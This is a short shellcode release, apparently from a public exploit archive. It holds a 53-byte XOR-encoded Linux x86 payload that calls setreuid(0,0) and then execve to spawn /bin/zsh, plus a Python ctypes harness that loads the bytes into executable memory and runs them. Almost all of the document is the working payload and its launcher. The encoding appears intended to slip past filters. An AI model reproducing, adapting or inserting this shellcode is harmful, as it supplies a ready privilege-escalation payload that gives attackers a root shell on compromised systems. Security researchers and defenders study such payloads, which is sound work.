# Title: Linux x86 setreuid (0,0) & execve("/bin/zsh", ["/bin/zsh", NULL]) + XOR encoded - 53 bytes
# Author: egeektronic <info (at) egeektronic {dot} com>
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono

from ctypes import *

shell = "\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x35\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x5f\x73\x6d\x04\xee\x04\xfc\xf8\xb5\x04\xe7\x5f\x3e\x6d\x67\x5d\x1a\x4f\x46\x5d\x5d\x1a\x57\x5c\x5b\xbc\xd6\x67\x66\xbc\xd4\xf8\xb5"

memory = create_string_buffer(shell, len(shell))

shellcode = cast(memory, CFUNCTYPE(c_void_p))

shellcode()